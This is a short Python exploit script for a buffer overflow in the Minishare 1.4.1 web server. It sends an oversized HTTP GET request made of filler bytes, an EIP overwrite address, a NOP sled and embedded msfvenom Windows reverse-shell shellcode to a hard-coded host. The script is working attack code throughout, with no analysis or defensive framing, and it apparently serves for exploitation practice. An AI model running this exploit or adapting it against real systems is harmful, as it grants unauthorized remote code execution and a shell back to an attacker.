#!/usr/bin/python

#
# Minishare 1.4.1 Buffer Overflow
# Author: 0xsaso
#

import socket
import sys

host = '192.168.1.161'
port = 80

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host, port)) 

prefix = "GET "                     # prefix for HTTP GET URI
end = " HTTP/1.1\r\n\r\n"           # end of HTTP GET req
filler = "A" * 1787		            # offset at 1788
offset = "\x53\x93\x42\x7e"			# BBBB to find EIP overwrite
nops = "\x90" * 19                  # NOP sled

# Payload generation: msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=XXXX -b "\x00\x0d" -f raw
shellcode = ("\xdd\xc6\xbd\x9e\x6a\xb9\xe1\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
             "\x52\x31\x6f\x17\x03\x6f\x17\x83\x59\x6e\x5b\x14\x99\x87\x19"
             "\xd7\x61\x58\x7e\x51\x84\x69\xbe\x05\xcd\xda\x0e\x4d\x83\xd6"
             "\xe5\x03\x37\x6c\x8b\x8b\x38\xc5\x26\xea\x77\xd6\x1b\xce\x16"
             "\x54\x66\x03\xf8\x65\xa9\x56\xf9\xa2\xd4\x9b\xab\x7b\x92\x0e"
             "\x5b\x0f\xee\x92\xd0\x43\xfe\x92\x05\x13\x01\xb2\x98\x2f\x58"
             "\x14\x1b\xe3\xd0\x1d\x03\xe0\xdd\xd4\xb8\xd2\xaa\xe6\x68\x2b"
             "\x52\x44\x55\x83\xa1\x94\x92\x24\x5a\xe3\xea\x56\xe7\xf4\x29"
             "\x24\x33\x70\xa9\x8e\xb0\x22\x15\x2e\x14\xb4\xde\x3c\xd1\xb2"
             "\xb8\x20\xe4\x17\xb3\x5d\x6d\x96\x13\xd4\x35\xbd\xb7\xbc\xee"
             "\xdc\xee\x18\x40\xe0\xf0\xc2\x3d\x44\x7b\xee\x2a\xf5\x26\x67"
             "\x9e\x34\xd8\x77\x88\x4f\xab\x45\x17\xe4\x23\xe6\xd0\x22\xb4"
             "\x09\xcb\x93\x2a\xf4\xf4\xe3\x63\x33\xa0\xb3\x1b\x92\xc9\x5f"
             "\xdb\x1b\x1c\xcf\x8b\xb3\xcf\xb0\x7b\x74\xa0\x58\x91\x7b\x9f"
             "\x79\x9a\x51\x88\x10\x61\x32\x77\x4c\x68\xaa\x1f\x8f\x6a\x2e"
             "\x32\x06\x8c\x44\xa2\x4f\x07\xf1\x5b\xca\xd3\x60\xa3\xc0\x9e"
             "\xa3\x2f\xe7\x5f\x6d\xd8\x82\x73\x1a\x28\xd9\x29\x8d\x37\xf7"
             "\x45\x51\xa5\x9c\x95\x1c\xd6\x0a\xc2\x49\x28\x43\x86\x67\x13"
             "\xfd\xb4\x75\xc5\xc6\x7c\xa2\x36\xc8\x7d\x27\x02\xee\x6d\xf1"
             "\x8b\xaa\xd9\xad\xdd\x64\xb7\x0b\xb4\xc6\x61\xc2\x6b\x81\xe5"
             "\x93\x47\x12\x73\x9c\x8d\xe4\x9b\x2d\x78\xb1\xa4\x82\xec\x35"
             "\xdd\xfe\x8c\xba\x34\xbb\xbd\xf0\x14\xea\x55\x5d\xcd\xae\x3b"
             "\x5e\x38\xec\x45\xdd\xc8\x8d\xb1\xfd\xb9\x88\xfe\xb9\x52\xe1"
             "\x6f\x2c\x54\x56\x8f\x65") 

buff = prefix + filler + offset + nops + shellcode + end

s.send(buff)
s.close()
